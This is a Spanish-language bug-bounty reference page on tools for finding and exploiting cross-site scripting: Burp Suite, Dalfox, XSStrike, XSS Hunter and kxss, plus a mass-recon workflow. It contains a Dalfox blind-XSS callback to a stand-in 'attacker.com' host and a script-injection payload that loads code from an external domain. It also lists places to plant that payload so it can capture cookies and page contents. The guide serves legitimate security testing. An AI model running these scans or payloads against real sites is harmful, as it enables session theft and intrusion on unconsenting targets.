# Herramientas

### Burp Suite

La herramienta principal para detectar y explotar XSS manualmente.

#### Scanner (Pro) - Detección automática

```
Target → Site map → clic derecho sobre request → Scan
Active Scan → XSS detectado con contexto exacto de inyección
```

#### Repeater - Explotación manual

```
1. Interceptar la petición → Send to Repeater (Ctrl+R)
2. Modificar el parámetro vulnerable con distintos payloads
3. Buscar el payload reflejado en la respuesta (Ctrl+F)
4. Identificar el contexto y adaptar el payload
```

#### Intruder - Fuerza bruta de payloads

```
1. Send to Intruder (Ctrl+I)
2. Marcar posición: §payload§
3. Payloads → Load → cargar lista de payloads XSS
4. Grep Match → añadir <script>, alert, onerror
5. Analizar qué payloads se reflejan sin ser bloqueados
```

Listas de payloads recomendadas:

```
SecLists: /Fuzzing/XSS/XSS-Jhaddix.txt
SecLists: /Fuzzing/XSS/XSS-BruteLogic.txt
PayloadsAllTheThings: XSS Injection/Intruder/
```

#### DOM Invader - DOM XSS

```
Extensión incluida en Burp Suite (también disponible en Burp Browser)

1. Abrir Burp Browser → Extensions → DOM Invader → Enable
2. Navegar por la aplicación
3. DOM Invader inyecta canarios automáticamente en todos los inputs
4. Cuando un canario llega a un sink peligroso → alerta automática
5. Ver el stack trace exacto: source → sink
```

### Dalfox

El scanner de XSS más potente en línea de comandos. Ideal para encontrar XSS en parámetros GET/POST y detectar el contexto de inyección.

#### Instalación

```bash
# Go
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS/Linux)
brew install dalfox

# Docker
docker run -it hahwul/dalfox:latest
```

#### Uso básico

```bash
# URL con parámetro GET
dalfox url "https://target.com/search?q=test"

# Especificar parámetro
dalfox url "https://target.com/search?q=test&page=1" -p q

# Con cookie de sesión
dalfox url "https://target.com/search?q=test" --cookie "session=abc123"

# POST request
dalfox url "https://target.com/login" --data "username=test&password=test"

# Desde request file de Burp
dalfox file request.txt
```

#### Opciones avanzadas

```bash
# Modo silencioso (solo reportar XSS encontrados)
dalfox url "https://target.com/search?q=test" --silence

# Payload personalizado
dalfox url "https://target.com/search?q=test" --custom-payload payloads.txt

# Blind XSS — especificar servidor de callback
dalfox url "https://target.com/search?q=test" --blind "https://attacker.com/xss"

# Ignorar parámetros concretos
dalfox url "https://target.com/" --skip "page,id"

# Con proxy Burp (para ver tráfico)
dalfox url "https://target.com/search?q=test" --proxy "http://127.0.0.1:8080"

# Múltiples URLs desde archivo
dalfox file urls.txt --silence

# Pipe desde otras herramientas
cat urls.txt | dalfox pipe

# Con headers personalizados
dalfox url "https://target.com/search?q=test" -H "Authorization: Bearer TOKEN"

# Aumentar workers (más rápido)
dalfox url "https://target.com/search?q=test" --worker 20

# Output a fichero
dalfox url "https://target.com/search?q=test" --output results.txt --format json
```

### XSStrike

Scanner de XSS con análisis de contexto y generación inteligente de payloads.

#### Instalación

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
```

#### Uso básico

```bash
# URL con parámetro
python3 xsstrike.py -u "https://target.com/search?q=test"

# Escanear formularios en la URL
python3 xsstrike.py -u "https://target.com/" --crawl

# POST request
python3 xsstrike.py -u "https://target.com/login" --data "username=test&password=test"

# Con cookie
python3 xsstrike.py -u "https://target.com/search?q=test" --headers "Cookie: session=abc123"

# Blind XSS
python3 xsstrike.py -u "https://target.com/search?q=test" --blind

# Modo fuzzing (más payloads)
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer

# Solo encontrar parámetros (no explotar)
python3 xsstrike.py -u "https://target.com/" --crawl --skip
```

### XSS Hunter

Plataforma web para capturar Blind XSS con callbacks automáticos.

```
URL: https://xsshunter.trufflesecurity.com/

Características:
- Proporciona un dominio único: abc123.xss.ht
- Genera payloads con callback automático
- Captura: URL de ejecución, cookies, DOM completo, screenshot, IP, User-Agent
- Notificaciones por email cuando se dispara un payload
```

#### Uso

```javascript
// Payload generado por XSS Hunter (ejemplo)
"><script src=//abc123.xss.ht></script>

// Insertarlo en campos de Blind XSS:
// - Tickets de soporte
// - Formularios de contacto
// - Campos de perfil
// - User-Agent / Referer
// - Importación de CSV
```

### kxss

Herramienta simple para detectar parámetros que reflejan input sin encoding, ideal para un primer filtrado masivo.

```bash
# Instalación
go install github.com/Emoe/kxss@latest

# Uso: pipe de URLs con parámetros
cat urls_with_params.txt | kxss

# Con waybackurls para encontrar URLs históricas con params
echo "target.com" | waybackurls | grep "=" | kxss
```

### Flujo completo de reconocimiento XSS

#### Descubrir URLs con parámetros

```bash
# 1. Recopilar URLs históricas
echo "target.com" | waybackurls > urls.txt
echo "target.com" | gau >> urls.txt

# 2. Filtrar URLs con parámetros
cat urls.txt | grep "=" > urls_with_params.txt

# 3. Primer filtrado con kxss (qué parámetros se reflejan)
cat urls_with_params.txt | kxss | tee reflected.txt

# 4. Scan profundo con dalfox sobre los reflejados
cat reflected.txt | dalfox pipe --silence | tee xss_found.txt
```

#### Con Burp Suite como proxy

```bash
# Usar dalfox con Burp como proxy para ver el tráfico
dalfox url "https://target.com/search?q=test" --proxy http://127.0.0.1:8080

# O pasar requests capturadas en Burp directamente
dalfox file burp_request.txt
```

### Recursos y referencias

| Recurso                       | URL                                                                             |
| ----------------------------- | ------------------------------------------------------------------------------- |
| PayloadsAllTheThings XSS      | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection |
| PortSwigger XSS Labs          | https://portswigger.net/web-security/cross-site-scripting                       |
| XSS Cheat Sheet (PortSwigger) | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet           |
| HackTricks XSS                | https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting             |
| CSP Evaluator                 | https://csp-evaluator.withgoogle.com/                                           |
| XSS Hunter                    | https://xsshunter.trufflesecurity.com/                                          |
| BruteLogic XSS                | https://brutelogic.com.br/blog/                                                 |
| SecLists XSS                  | https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS              |

> Para recon masivo: `waybackurls` + `kxss` para filtrar parámetros reflejados → `dalfox` para confirmar y explotar. Mucho más eficiente que scanear URL por URL.

> **DOM Invader** de Burp es imprescindible para DOM XSS en SPAs (React, Angular, Vue) donde hay mucho JS y los sinks no son obvios.

> En bug bounty, siempre confirmar manualmente el XSS antes de reportar — los falsos positivos de scanners automáticos son comunes, especialmente en contextos JS complejos.
